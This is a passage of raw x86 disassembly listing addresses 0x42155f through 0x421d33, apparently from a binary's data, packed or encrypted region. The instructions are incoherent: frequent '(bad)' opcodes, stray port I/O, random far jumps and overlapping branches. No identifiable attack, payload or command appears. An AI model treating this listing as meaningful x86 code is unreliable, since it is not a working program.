  42155f:	xor    esi,DWORD PTR [eax]
  421561:	(bad)  
  421562:	fiadd  WORD PTR [esi]
  421564:	sbb    DWORD PTR [ecx],eax
  421566:	in     eax,0xb5
  421568:	dec    esp
  421569:	popa   
  42156a:	xchg   edx,eax
  42156b:	in     al,0x33
  42156d:	enter  0x4ea3,0x3b
  421571:	jmp    0x49390116
  421576:	push   edi
  421577:	leave  
  421578:	add    ch,ch
  42157a:	mov    esp,0x49f62656
  42157f:	pop    edx
  421580:	xor    DWORD PTR ds:0x81f0e77f,esi
  421586:	enter  0x720b,0x3e
  42158a:	in     eax,0xee
  42158c:	fnstcw WORD PTR [edi-0x1138569e]
  421592:	adc    bl,BYTE PTR [esi+ebx*1]
  421595:	jnp    0x421592
  421597:	clc    
  421598:	xchg   ebp,eax
  421599:	sbb    ebx,0x52
  42159c:	or     ah,BYTE PTR [esi+0x65]
  42159f:	fistp  WORD PTR [ebp+0x27]
  4215a2:	mov    edi,edx
  4215a4:	ror    DWORD PTR [esp+edx*4],cl
  4215a7:	push   edi
  4215a8:	outs   dx,DWORD PTR ds:[esi]
  4215a9:	faddp  st(0),st
  4215ab:	xchg   edx,eax
  4215ac:	mov    gs,WORD PTR [eax+0x4b]
  4215af:	das    
  4215b0:	imul   ebp,DWORD PTR [ebp+0x20],0x31347ca1
  4215b7:	sub    BYTE PTR [eax+0xeb19010],0xc9
  4215be:	jb     0x421564
  4215c0:	push   esp
  4215c1:	cmp    DWORD PTR [eax],esi
  4215c3:	xchg   edx,eax
  4215c4:	int3   
  4215c5:	aad    0x3b
  4215c7:	mov    cl,0x9d
  4215c9:	mov    ds:0xcc2a8f88,eax
  4215ce:	sar    ah,cl
  4215d0:	push   edx
  4215d1:	push   0xffffffc6
  4215d3:	mov    edx,esp
  4215d5:	and    cl,BYTE PTR [esi+0x2a473aec]
  4215db:	jne    0x42163d
  4215dd:	xor    eax,0x4352a801
  4215e2:	cmp    ah,BYTE PTR [esi+ebx*4+0x1909a6fd]
  4215e9:	push   edi
  4215ea:	dec    ecx
  4215eb:	aam    0xcc
  4215ed:	aad    0x43
  4215ef:	mov    ah,0xe2
  4215f1:	je     0x421625
  4215f3:	ja     0x4215aa
  4215f5:	adc    edi,DWORD PTR [ecx+edi*8-0x5]
  4215f9:	das    
  4215fa:	cmp    ah,BYTE PTR [eax-0x3b]
  4215fd:	jne    0x421667
  4215ff:	sub    ebx,DWORD PTR [ebp-0x41d9731d]
  421605:	in     eax,0x81
  421607:	cmp    DWORD PTR [ebx+0xb],ebp
  42160a:	fild   WORD PTR [eax+ebx*4-0x1e0731c2]
  421611:	and    eax,0x4cbc2d40
  421616:	outs   dx,BYTE PTR ds:[esi]
  421617:	push   edi
  421618:	setle  dh
  42161b:	fsub   QWORD PTR [ecx]
  42161d:	and    ch,BYTE PTR [esp+ebp*8]
  421620:	int3   
  421621:	xor    DWORD PTR [ebx+0x2a16bd4e],0xffffffa7
  421628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421629:	lahf   
  42162a:	mov    ds:0x3654802e,eax
  42162f:	in     eax,dx
  421630:	stos   DWORD PTR es:[edi],eax
  421631:	test   esi,edi
  421633:	sbb    BYTE PTR [ebx-0x24],al
  421636:	out    0x7f,al
  421638:	inc    ebp
  421639:	cmp    eax,0xb5b3a744
  42163e:	dec    esi
  42163f:	xchg   DWORD PTR [edi],esp
  421641:	cmp    BYTE PTR [ebp-0x61],ah
  421644:	cmp    eax,0x4111254a
  421649:	jne    0x42163d
  42164b:	jl     0x421622
  42164d:	inc    esp
  42164e:	pop    ebp
  42164f:	cmp    ecx,DWORD PTR [edi]
  421651:	xor    BYTE PTR [edi+0x39],bl
  421654:	dec    eax
  421655:	add    eax,DWORD PTR [edx]
  421657:	aad    0xa8
  421659:	arpl   WORD PTR [edi],cx
  42165b:	test   al,0x1e
  42165d:	mov    DWORD PTR ds:0xd6a861fd,ecx
  421663:	data16 out dx,al
  421665:	int    0x47
  421667:	dec    esi
  421668:	push   ds
  421669:	stos   BYTE PTR es:[edi],al
  42166a:	push   0x22a603d5
  42166f:	pop    esp
  421670:	jl     0x42169d
  421672:	xor    ah,BYTE PTR [edx-0x69a59df5]
  421678:	inc    ebx
  421679:	nop
  42167a:	sbb    eax,0xf4531975
  42167f:	xchg   esp,eax
  421680:	shl    BYTE PTR [eax-0x61],0x8a
  421684:	ror    edi,cl
  421686:	sar    ecx,0xd8
  421689:	das    
  42168a:	sbb    DWORD PTR [edi],0x51f4abc0
  421690:	fimul  DWORD PTR [esi+ebx*4+0x48a3d05f]
  421697:	push   cs
  421698:	pop    ebp
  421699:	or     al,0x44
  42169b:	in     al,0xcb
  42169d:	mov    ecx,0x7f20c5ad
  4216a2:	cwde   
  4216a3:	cmp    eax,0x33ec0191
  4216a8:	in     al,0x3
  4216aa:	mov    bh,0x5c
  4216ac:	bts    DWORD PTR ds:0x86db13ec,ecx
  4216b3:	mov    bl,0x6b
  4216b5:	xchg   ecx,eax
  4216b6:	stos   BYTE PTR es:[edi],al
  4216b7:	mov    dl,0xc1
  4216ba:	xor    al,0xf0
  4216bc:	in     al,0xc5
  4216be:	imul   esp,DWORD PTR [edi+0x20153c2],0x5655c8c
  4216c8:	stc    
  4216c9:	(bad)  
  4216ca:	xchg   ecx,eax
  4216cb:	mov    al,0x1
  4216cd:	retf   
  4216ce:	(bad)  
  4216cf:	test   BYTE PTR ds:0xe4c2de99,0x65
  4216d6:	jo     0x42169a
  4216d8:	sub    ecx,esp
  4216da:	xor    edx,DWORD PTR [edi]
  4216dc:	leave  
  4216dd:	ret    
  4216de:	stos   DWORD PTR es:[edi],eax
  4216df:	pop    ebx
  4216e0:	mov    al,0x8d
  4216e2:	cdq    
  4216e3:	popa   
  4216e4:	and    DWORD PTR [ebx],ebx
  4216e6:	outs   dx,BYTE PTR ds:[esi]
  4216e7:	pop    edi
  4216e8:	call   0x1071bedc
  4216ed:	(bad)  
  4216ee:	pop    ss
  4216ef:	arpl   WORD PTR [edx-0x2d],di
  4216f2:	or     BYTE PTR es:[eax-0x344cd5ed],bl
  4216f9:	adc    BYTE PTR [ebx+0x45],bh
  4216fc:	sub    dl,BYTE PTR [ebx+ebp*2+0x59bf29b7]
  421703:	xor    DWORD PTR [ecx],esi
  421705:	ds popa 
  421707:	sbb    DWORD PTR [eax-0x7907c9ea],ebx
  42170d:	mov    edi,0x5481385b
  421712:	xor    edx,DWORD PTR ds:0x7bcc46c
  421718:	inc    edi
  421719:	push   cs
  42171a:	cmp    edx,DWORD PTR [eax]
  42171c:	out    dx,eax
  42171d:	or     DWORD PTR [edx-0x64],esp
  421720:	or     BYTE PTR [edi+eax*1],ah
  421723:	xor    BYTE PTR [ebx+ecx*8],bl
  421726:	mov    dh,0x4
  421728:	repz cdq 
  42172a:	mov    eax,0x314ec8ff
  42172f:	cmp    eax,0xafff7210
  421734:	(bad)  
  421735:	and    DWORD PTR [ebx],eax
  421737:	mov    esp,0x6f59ad9b
  42173c:	rcr    BYTE PTR [ecx-0x388961f5],0xa2
  421743:	or     ah,BYTE PTR [edi-0x29]
  421746:	call   0xd8635b34
  42174b:	mov    bl,BYTE PTR [edi]
  42174d:	mov    bl,0x47
  42174f:	cs jmp 0x711c1774
  421755:	aas    
  421756:	inc    edx
  421757:	repz into 
  421759:	mov    DWORD PTR ds:0x7368d9bd,ebx
  42175f:	retf   
  421760:	xchg   edi,eax
  421761:	aad    0x1c
  421763:	mov    ebp,0x6b59637
  421768:	call   0x8a27:0xcb693b29
  42176f:	fnsave [ebp+0x720f8d03]
  421775:	jo     0x4216f9
  421777:	pusha  
  421778:	push   ss
  421779:	mov    fs,WORD PTR [ebx+eiz*8]
  42177c:	loop   0x42171b
  42177e:	adc    al,0xf9
  421780:	scas   eax,DWORD PTR es:[edi]
  421781:	js     0x42170f
  421783:	mov    bl,0xbb
  421785:	push   ebp
  421786:	sti    
  421787:	outs   dx,DWORD PTR ds:[esi]
  421788:	and    al,ah
  42178a:	adc    bh,BYTE PTR [edi+eiz*4]
  42178d:	inc    ecx
  42178e:	dec    ebx
  42178f:	pop    esi
  421790:	jmp    0x42171d
  421792:	enter  0x8b44,0x8c
  421796:	xchg   edi,eax
  421797:	mov    esi,0x1ca5b131
  42179c:	ret    0x8c33
  42179f:	xchg   esp,eax
  4217a0:	out    0xc4,eax
  4217a2:	stos   DWORD PTR es:[edi],eax
  4217a3:	xor    al,0xb3
  4217a5:	hlt    
  4217a6:	pop    ss
  4217a7:	in     al,0x3c
  4217a9:	shr    BYTE PTR [eax],cl
  4217ab:	pop    es
  4217ac:	sub    eax,0xc9092f56
  4217b1:	test   DWORD PTR [esi+0x35],0xcc71957c
  4217b8:	xor    ebx,DWORD PTR [ecx]
  4217ba:	mov    ch,0xf3
  4217bc:	and    DWORD PTR ds:0x8b679445,ecx
  4217c2:	sub    al,0x23
  4217c4:	jb     0x421763
  4217c6:	or     bl,BYTE PTR [edi-0x230fd93d]
  4217cc:	adc    DWORD PTR [esi-0x47ea9264],edi
  4217d2:	push   edx
  4217d3:	scas   eax,DWORD PTR es:[edi]
  4217d4:	enter  0x8679,0xfc
  4217d8:	xor    BYTE PTR [ecx-0x24],dh
  4217db:	xchg   ecx,eax
  4217dc:	pop    edx
  4217dd:	loopne 0x42178d
  4217df:	out    dx,al
  4217e0:	jae    0x4217ac
  4217e2:	adc    ch,BYTE PTR [edx-0x42e865d2]
  4217e8:	sub    al,BYTE PTR [edi+eax*4+0x9]
  4217ec:	ficomp DWORD PTR [ecx+0x2ee7a890]
  4217f2:	ss fucomi st,st(2)
  4217f5:	and    BYTE PTR [esi],0xad
  4217f8:	data16 hlt 
  4217fa:	sub    DWORD PTR [ebp-0x6],0xc6ac2e58
  421801:	fwait
  421802:	or     al,BYTE PTR [ecx-0x6451758c]
  421808:	dec    esi
  421809:	int3   
  42180a:	push   ecx
  42180b:	cwde   
  42180c:	inc    ebp
  42180d:	pop    eax
  42180e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42180f:	cmp    ecx,DWORD PTR [edx+0x40fd493c]
  421815:	out    dx,eax
  421816:	xchg   edx,eax
  421817:	out    dx,eax
  421818:	out    0x8f,al
  42181a:	test   DWORD PTR [esi+0xb90f3f],edx
  421820:	jmp    0x16a718fd
  421825:	lock push ss
  421827:	pushf  
  421828:	push   ecx
  421829:	mov    edi,0xbaefe65a
  42182e:	(bad)  
  42182f:	mov    BYTE PTR [edx+0x151dcf46],cl
  421835:	lock neg DWORD PTR [edx+0x41acac9a]
  42183c:	cmp    al,0xbe
  42183e:	test   BYTE PTR [ebx],dl
  421840:	mov    al,ds:0x944d565
  421845:	cmp    al,0x55
  421847:	or     DWORD PTR [esi-0x16292105],edx
  42184d:	push   edx
  42184e:	jmp    0x1d94bbe1
  421853:	push   0x56a1ea86
  421858:	xchg   ecx,eax
  421859:	xchg   esi,eax
  42185a:	push   edi
  42185b:	gs mov ebp,0xd04ae0cb
  421861:	(bad)  
  421862:	ins    DWORD PTR es:[edi],dx
  421863:	call   0xef3d0e9d
  421868:	icebp  
  421869:	mul    DWORD PTR [esi+eiz*8+0x5f]
  42186d:	add    al,bl
  42186f:	push   ecx
  421870:	jl     0x4218e5
  421872:	es jne 0x4218f3
  421875:	aam    0xe4
  421877:	mov    cl,0x6e
  421879:	sbb    dl,BYTE PTR [edi+0x9]
  42187c:	jp     0x421817
  42187e:	mov    esi,0x30d7d2b4
  421883:	sbb    al,0x1
  421885:	jae    0x421833
  421887:	mov    al,ds:0x96beea5d
  42188c:	daa    
  42188d:	xchg   ebx,eax
  42188e:	repz jns 0x42184f
  421891:	xlat   BYTE PTR ds:[ebx]
  421892:	test   eax,0xc9aa55d7
  421897:	ss ret 
  421899:	sbb    bl,BYTE PTR [edx-0x65]
  42189c:	in     al,dx
  42189d:	push   ecx
  42189e:	or     al,0xe9
  4218a0:	inc    edi
  4218a1:	imul   ebp,DWORD PTR [edi-0x6d],0xffffff97
  4218a5:	mov    al,ds:0xa9479573
  4218aa:	dec    ebx
  4218ab:	arpl   WORD PTR [ecx+0x2cb98a09],di
  4218b1:	pop    edi
  4218b2:	loopne 0x42188e
  4218b4:	adc    cl,BYTE PTR [ebx-0x29d7da44]
  4218ba:	pop    ebp
  4218bb:	dec    edx
  4218bd:	fsubr  DWORD PTR [eax-0xc4608b5]
  4218c3:	(bad)  
  4218c4:	pop    esp
  4218c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218c6:	mov    ah,0x27
  4218c8:	mov    BYTE PTR [ecx],dl
  4218ca:	aam    0x4
  4218cc:	mov    ds:0x157fd781,al
  4218d1:	out    0xb3,eax
  4218d3:	ins    BYTE PTR es:[edi],dx
  4218d4:	sub    al,0x35
  4218d6:	stos   BYTE PTR es:[edi],al
  4218d7:	inc    ecx
  4218d8:	and    bl,dh
  4218da:	inc    edx
  4218db:	or     BYTE PTR [ecx-0x4f],0x4c
  4218df:	dec    eax
  4218e0:	or     DWORD PTR [esi],ecx
  4218e2:	ficomp DWORD PTR [ecx]
  4218e4:	out    0x5e,eax
  4218e6:	int    0x20
  4218e8:	push   0x18
  4218ea:	rcr    DWORD PTR [ecx-0x6bb3563f],0xb6
  4218f1:	jg     0x4218a8
  4218f3:	das    
  4218f4:	adc    ebx,DWORD PTR [edi+0x4c7f9134]
  4218fa:	xor    al,0xa2
  4218fc:	inc    esp
  4218fd:	inc    edi
  4218fe:	test   eax,0xa60cc464
  421903:	stc    
  421904:	mov    DWORD PTR [ecx],ebx
  421906:	adc    al,0x56
  421908:	(bad)  
  421909:	in     eax,0x55
  42190b:	xchg   ebp,eax
  42190c:	dec    esi
  42190d:	jbe    0x421913
  42190f:	loopne 0x421965
  421911:	xchg   edx,eax
  421912:	test   dl,dl
  421914:	inc    ebx
  421916:	push   ebp
  421917:	pop    esp
  421918:	ret    
  421919:	in     al,0x7c
  42191b:	(bad)  
  42191c:	sti    
  42191d:	xor    BYTE PTR [ecx+esi*2-0x13],al
  421921:	jecxz  0x421978
  421923:	pop    ebx
  421924:	popa   
  421925:	adc    cl,bl
  421927:	sbb    edx,ecx
  421929:	xchg   edx,edx
  42192b:	in     al,0xa6
  42192d:	jg     0x42196c
  42192f:	gs xchg esi,eax
  421931:	push   esp
  421932:	clc    
  421933:	addr16 daa 
  421935:	ret    
  421936:	xchg   esp,eax
  421937:	repz fistp QWORD PTR [edx-0x4d]
  42193b:	fstp   DWORD PTR [edx+eiz*2+0x9]
  42193f:	xor    edi,DWORD PTR [esi-0x38]
  421942:	pusha  
  421943:	pop    ds
  421944:	fldlg2 
  421946:	imul   edx,DWORD PTR [esi+ecx*8],0xa79a11c6
  42194d:	inc    eax
  42194e:	and    esp,DWORD PTR [ebx]
  421950:	and    ebx,DWORD PTR ds:0x19b3315c
  421956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421957:	pop    ss
  421958:	or     BYTE PTR [eax],dh
  42195a:	lods   al,BYTE PTR ds:[esi]
  42195b:	adc    eax,0x24f37e01
  421960:	test   edx,ecx
  421962:	es or  edx,ecx
  421965:	cmp    al,0x4c
  421967:	adc    ah,bh
  421969:	bound  edx,QWORD PTR [edi+0x52449067]
  42196f:	into   
  421970:	dec    edi
  421971:	sbb    DWORD PTR [edx+0xa1c44ee],0x4401b94c
  42197b:	and    eax,0xf3c3fe97
  421980:	shl    DWORD PTR [edx-0x46],0x8d
  421984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421985:	aaa    
  421986:	xor    BYTE PTR [eax-0x65cabd51],0xd7
  42198d:	into   
  42198e:	cld    
  42198f:	dec    ecx
  421990:	dec    ebp
  421991:	cmp    DWORD PTR [ecx],ebp
  421993:	retf   0x661
  421996:	sar    DWORD PTR [ecx+eax*1],0x1b
  42199a:	sub    DWORD PTR [esi],eax
  42199c:	pop    ecx
  42199d:	mov    edx,0x1a880441
  4219a2:	mov    esp,0xe15efab5
  4219a7:	scas   al,BYTE PTR es:[edi]
  4219a8:	dec    edx
  4219a9:	std    
  4219aa:	add    BYTE PTR [edx-0x41],ch
  4219ad:	pop    ebx
  4219ae:	(bad)  
  4219af:	(bad)  
  4219b0:	scas   al,BYTE PTR es:[edi]
  4219b1:	(bad)  
  4219b2:	aas    
  4219b3:	es xchg esp,eax
  4219b5:	les    ebp,FWORD PTR ds:0xdb5858d4
  4219bb:	add    BYTE PTR [edi],ch
  4219bd:	xchg   ebx,eax
  4219be:	fidivr DWORD PTR [esi-0x23]
  4219c1:	dec    esi
  4219c2:	and    BYTE PTR ds:[edi],0xe7
  4219c6:	rol    DWORD PTR [ebp+0x12],0x29
  4219ca:	cmp    bh,bl
  4219cc:	loopne 0x421a16
  4219ce:	in     eax,0x32
  4219d0:	mov    ?,WORD PTR [ebp-0x1d]
  4219d3:	repz in al,dx
  4219d5:	push   ebx
  4219d6:	retf   0xe5f4
  4219d9:	sbb    BYTE PTR [edx],ah
  4219db:	sbb    DWORD PTR [edx+0x66],edx
  4219de:	push   ds
  4219df:	jmp    FWORD PTR [esi-0x6d63bb17]
  4219e5:	sub    eax,DWORD PTR [esi-0x28]
  4219e8:	pop    eax
  4219e9:	pop    es
  4219ea:	ret    0x7365
  4219ed:	clc    
  4219ee:	idiv   BYTE PTR [edi+0x67]
  4219f1:	adc    dh,BYTE PTR [eax+eiz*1-0x19]
  4219f5:	in     al,0xea
  4219f7:	pop    edx
  4219f8:	adc    DWORD PTR [esi-0x6aacbc58],esi
  4219fe:	mov    edi,0xd82ada05
  421a03:	mov    DWORD PTR [esi],ecx
  421a05:	mov    esi,0xd1025b6b
  421a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a0b:	cmc    
  421a0c:	shr    BYTE PTR [eax+0x1ba5d5bd],1
  421a12:	adc    DWORD PTR [edx+0x5f69bc77],0xffffffaf
  421a19:	es jmp 0x4464:0xfbeb2c60
  421a21:	jo     0x4219ab
  421a23:	pop    ecx
  421a24:	sub    eax,0x686deade
  421a29:	xchg   edi,eax
  421a2a:	dec    eax
  421a2b:	call   0x6ab3:0x73205f50
  421a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a33:	jnp    0x4219d5
  421a35:	mov    dh,0x24
  421a37:	fwait
  421a38:	(bad)  
  421a39:	in     eax,0x50
  421a3b:	or     al,0x5a
  421a3d:	lds    ebp,FWORD PTR fs:0x78b6a130
  421a44:	jo     0x421a45
  421a46:	sub    al,0xde
  421a48:	or     edi,esp
  421a4a:	mov    al,0x74
  421a4c:	pop    ss
  421a4d:	xlat   BYTE PTR ds:[ebx]
  421a4e:	leave  
  421a4f:	scas   al,BYTE PTR es:[edi]
  421a50:	jmp    0x2490:0xb7a90142
  421a57:	xchg   ebx,eax
  421a58:	dec    ebx
  421a59:	inc    eax
  421a5a:	sub    DWORD PTR gs:0xa8c0222f,esp
  421a61:	rol    dl,0x20
  421a64:	out    0x55,al
  421a66:	xor    cl,BYTE PTR [edi-0x70]
  421a69:	loope  0x421acb
  421a6b:	and    edi,DWORD PTR [ecx+0x18]
  421a6e:	xlat   BYTE PTR ds:[ebx]
  421a6f:	or     bh,BYTE PTR [esi]
  421a71:	xor    ch,BYTE PTR [ecx-0x3c08393b]
  421a77:	mov    ecx,0xf58ebd2f
  421a7c:	add    cl,BYTE PTR [ecx]
  421a7e:	fdiv   st(5),st
  421a80:	add    eax,DWORD PTR [edi+0x6c5b8798]
  421a86:	xor    edx,edx
  421a88:	in     eax,dx
  421a89:	iret   
  421a8a:	and    bh,BYTE PTR [ecx+0x49]
  421a8d:	cmc    
  421a8e:	addr16 and eax,0x1f066bde
  421a94:	(bad)
  421a98:	inc    edi
  421a99:	fs push ebx
  421a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a9c:	popa   
  421a9d:	mov    ds:0x6fbf0533,eax
  421aa2:	xor    eax,0x8c8a1b5c
  421aa7:	test   DWORD PTR [edx+0x48],esp
  421aaa:	mov    ah,0x4
  421aac:	dec    ebx
  421aad:	(bad)  
  421aae:	inc    edi
  421aaf:	fcomp  DWORD PTR [ecx+0x346c8961]
  421ab5:	out    0xd3,al
  421ab7:	sub    al,0xef
  421ab9:	dec    edx
  421aba:	jp     0x421ae9
  421abc:	xor    edi,esp
  421abe:	adc    eax,0x73ee9f4b
  421ac3:	add    edi,ebx
  421ac5:	test   BYTE PTR [edx+0x2e],dl
  421ac8:	ins    DWORD PTR es:[edi],dx
  421ac9:	jmp    0x3af8:0xbe493379
  421ad0:	inc    esi
  421ad1:	or     DWORD PTR [ebp+edx*8-0x70b8c8f7],ebp
  421ad8:	push   cs
  421ad9:	sub    DWORD PTR [ecx],edx
  421adb:	dec    ecx
  421adc:	bts    ebp,edi
  421adf:	xchg   edx,eax
  421ae0:	mov    bl,0x6a
  421ae2:	or     dl,BYTE PTR [ebx+0x57]
  421ae5:	in     eax,0x58
  421ae7:	push   esi
  421ae8:	shl    BYTE PTR [esi],cl
  421aea:	adc    edx,DWORD PTR [ebx-0x20]
  421aed:	jo     0x421b0f
  421aef:	pusha  
  421af0:	add    bh,al
  421af2:	rcl    DWORD PTR [edx+0x64],0x10
  421af6:	dec    eax
  421af7:	jmp    0x421a83
  421af9:	sar    DWORD PTR [esi-0x6eaa2b09],1
  421aff:	adc    eax,0xf082b9dc
  421b04:	sar    DWORD PTR [edx-0x45],cl
  421b07:	aaa    
  421b08:	mov    edx,0x6600e3e5
  421b0d:	jno    0x421ad2
  421b0f:	mov    ecx,0x6c55743d
  421b14:	xor    bh,BYTE PTR [ebx-0x28]
  421b17:	cwde   
  421b18:	test   eax,0xf28ff26f
  421b1d:	sub    BYTE PTR [edi+0x4c],ch
  421b20:	std    
  421b21:	(bad)  [ecx+0x1d]
  421b24:	xlat   BYTE PTR ds:[ebx]
  421b25:	xor    al,BYTE PTR [ebx+0x765081e0]
  421b2b:	lods   al,BYTE PTR ds:[esi]
  421b2c:	fdiv   DWORD PTR [ecx]
  421b2e:	cmp    ecx,ebp
  421b30:	or     DWORD PTR [esi],ebp
  421b32:	xlat   BYTE PTR ds:[ebx]
  421b33:	mov    BYTE PTR [eax+0xa7a1b6b],dl
  421b39:	aaa    
  421b3a:	sar    BYTE PTR [ecx-0x3d6bb5bb],0x76
  421b41:	pushf  
  421b42:	cmp    edx,0x612212d9
  421b48:	jmp    0xff9b5b88
  421b4d:	add    ecx,DWORD PTR [edx+0x1e]
  421b50:	pop    esi
  421b51:	xor    al,0xa0
  421b53:	pavgw  mm7,QWORD PTR [edi-0x1d]
  421b57:	xor    eax,0x8882a1da
  421b5c:	std    
  421b5d:	cmp    al,0x4f
  421b5f:	std    
  421b60:	fidivr WORD PTR [edi+0x34]
  421b63:	mov    BYTE PTR [edx],bh
  421b65:	retf   
  421b66:	lods   al,BYTE PTR ds:[esi]
  421b67:	data16 mov al,ch
  421b6a:	jg     0x421b9e
  421b6c:	add    bh,ch
  421b6e:	adc    bh,dh
  421b70:	std    
  421b71:	pushf  
  421b72:	daa    
  421b73:	mov    al,ds:0xd6110f6a
  421b78:	jae    0x421bbd
  421b7a:	jnp    0x421b7e
  421b7c:	cmp    eax,0x62354de6
  421b81:	ret    0x5abd
  421b84:	and    ecx,eax
  421b86:	jmp    0x421be8
  421b88:	pushf  
  421b89:	xchg   DWORD PTR [edx],ecx
  421b8b:	xor    eax,0x6ab6f3f1
  421b90:	(bad)  
  421b92:	call   FWORD PTR [eax]
  421b94:	popf   
  421b95:	enter  0xa37a,0xcc
  421b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b9a:	aas    
  421b9b:	leave  
  421b9c:	aad    0xef
  421b9e:	jb     0x421bcc
  421ba0:	mov    bh,0x8a
  421ba2:	mov    bh,0x96
  421ba4:	imul   ebx,DWORD PTR [eax],0x68
  421ba7:	inc    ecx
  421ba8:	mov    ebx,DWORD PTR [ebx]
  421baa:	sub    al,0x99
  421bac:	sub    ah,BYTE PTR [edx+ebx*1+0x7f]
  421bb0:	nop
  421bb1:	and    dh,BYTE PTR [ecx+ebp*4-0x4e078175]
  421bb8:	sub    eax,0xa132e505
  421bbd:	cmp    al,0x94
  421bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bc0:	ss push edi
  421bc2:	repz addr16 xor al,0xa
  421bc6:	gs mov ebp,0x1e5c495a
  421bcc:	jle    0x421be0
  421bce:	cmc    
  421bcf:	push   ebx
  421bd0:	sbb    cl,BYTE PTR [esi]
  421bd2:	add    esi,0x46
  421bd5:	mov    ecx,0xd731d87d
  421bda:	cmp    al,0x53
  421bdc:	fdivr  DWORD PTR [edx+0x1d]
  421bdf:	jnp    0x421c55
  421be1:	mov    dh,0xf4
  421be3:	sbb    esp,0x4faa9ffe
  421be9:	jns    0x421c43
  421beb:	cmp    BYTE PTR [ebp+0x7f3d7390],0x8a
  421bf2:	adc    eax,0x560c0904
  421bf7:	xor    DWORD PTR [edx+0x58],eax
  421bfa:	cld    
  421bfb:	mov    ebx,0x8dc4d62
  421c00:	cdq    
  421c01:	lahf   
  421c02:	out    dx,eax
  421c03:	xor    ch,BYTE PTR [ebx-0x61]
  421c06:	es (bad) 
  421c08:	jo     0x421c01
  421c0a:	test   al,0xee
  421c0c:	lds    esi,FWORD PTR [edi+0x3bd814fa]
  421c12:	sub    edx,DWORD PTR [ecx]
  421c14:	addr16 xchg ecx,eax
  421c16:	nop
  421c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c18:	(bad)  
  421c19:	cmp    al,0x8f
  421c1b:	ret    
  421c1c:	aad    0x51
  421c1e:	enter  0xd3c3,0xf2
  421c22:	and    dh,BYTE PTR [esi+0x41]
  421c25:	mov    cl,0xd2
  421c27:	jmp    0xa0a7:0x1efd1723
  421c2e:	dec    esi
  421c2f:	xor    al,BYTE PTR [edx-0x74]
  421c32:	jle    0x421c16
  421c34:	in     eax,dx
  421c35:	ss cld 
  421c37:	mov    bl,0x51
  421c39:	mov    eax,edx
  421c3b:	pusha  
  421c3c:	and    eax,DWORD PTR [edi+0x38]
  421c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c40:	cwde   
  421c41:	sub    BYTE PTR [ebp+0x4009130a],0x3b
  421c48:	div    BYTE PTR [eax+0x4875cc76]
  421c4e:	jge    0x421c96
  421c50:	dec    ecx
  421c51:	int3   
  421c52:	sti    
  421c53:	xchg   BYTE PTR [ecx+ebx*4],dl
  421c56:	pop    ss
  421c57:	mov    ah,BYTE PTR ds:0xa75a6d8e
  421c5d:	mov    al,ss:0xe18f5edb
  421c63:	xchg   DWORD PTR [ebx+0x2f],ecx
  421c66:	xchg   esi,eax
  421c67:	push   esi
  421c68:	ds or  ecx,esp
  421c6b:	dec    eax
  421c6c:	jbe    0x421c77
  421c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c6f:	or     DWORD PTR [eax+ecx*2+0x35],esp
  421c73:	fisttp QWORD PTR [eax+ecx*2-0x42]
  421c77:	fadd   st,st(0)
  421c79:	xchg   edx,eax
  421c7a:	call   0x5e1a:0x36b9ad91
  421c81:	sahf   
  421c82:	jnp    0x421ccc
  421c84:	inc    ecx
  421c85:	in     eax,0x42
  421c87:	push   esp
  421c88:	xor    bh,BYTE PTR [ebx+0x7c76191c]
  421c8e:	pop    ds
  421c8f:	pop    eax
  421c90:	inc    eax
  421c91:	loop   0x421d03
  421c93:	mov    BYTE PTR [edx+0x24],bh
  421c96:	mov    ebx,0xa88423a8
  421c9b:	call   FWORD PTR [esi-0x3aab9db1]
  421ca1:	mov    edi,0x541dfb8d
  421ca6:	out    dx,eax
  421ca7:	dec    edi
  421ca8:	rol    DWORD PTR [esi],cl
  421caa:	add    BYTE PTR [eax+0x5f3b5580],bl
  421cb0:	xchg   ecx,eax
  421cb1:	adc    DWORD PTR [ebp-0x27],0x40da8511
  421cb8:	jnp    0x421c96
  421cba:	test   eax,0x9e4ca41b
  421cbf:	xchg   edx,eax
  421cc0:	inc    ebp
  421cc1:	test   DWORD PTR [esi-0x7f59bfc1],edi
  421cc7:	mov    ebp,0xc7197ad9
  421ccc:	and    edi,ebx
  421cce:	addr16 lahf 
  421cd0:	outs   dx,DWORD PTR ds:[esi]
  421cd1:	and    DWORD PTR [ecx+0x459eee97],edx
  421cd7:	push   esp
  421cd8:	and    eax,0xf327656a
  421cdd:	std    
  421cde:	add    edi,DWORD PTR [esi-0x50bacd9a]
  421ce4:	xchg   ebp,eax
  421ce5:	in     eax,dx
  421ce6:	and    al,0x36
  421ce8:	lods   al,BYTE PTR ds:[esi]
  421ce9:	jg     0x421cd6
  421ceb:	div    BYTE PTR [esi-0x57284081]
  421cf1:	mov    esi,0x47d4a7a4
  421cf6:	popa   
  421cf7:	fiadd  DWORD PTR [ecx+0x7e]
  421cfa:	xor    ebp,DWORD PTR [eax+0x55bd9d89]
  421d00:	jns    0x421d00
  421d02:	sahf   
  421d03:	push   es
  421d04:	outs   dx,BYTE PTR ds:[esi]
  421d05:	iret   
  421d06:	ja     0x421cca
  421d08:	sar    BYTE PTR [ebx+0x151ae9e2],cl
  421d0e:	and    dl,ch
  421d10:	adc    DWORD PTR [edi],ecx
  421d12:	xchg   edi,eax
  421d13:	daa    
  421d14:	inc    edi
  421d15:	sbb    eax,0x288d4ea0
  421d1a:	push   ecx
  421d1b:	call   FWORD PTR [ebx+0x6df2bb74]
  421d21:	mov    edi,0xd0ed0e81
  421d26:	repnz adc al,0x7e
  421d29:	lds    ebx,FWORD PTR [ecx]
  421d2b:	cmp    al,0x7a
  421d2d:	sbb    al,0xd9
  421d2f:	jae    0x421d89
  421d31:	mov    ah,0x99
  421d33:	push   0xd596db5a
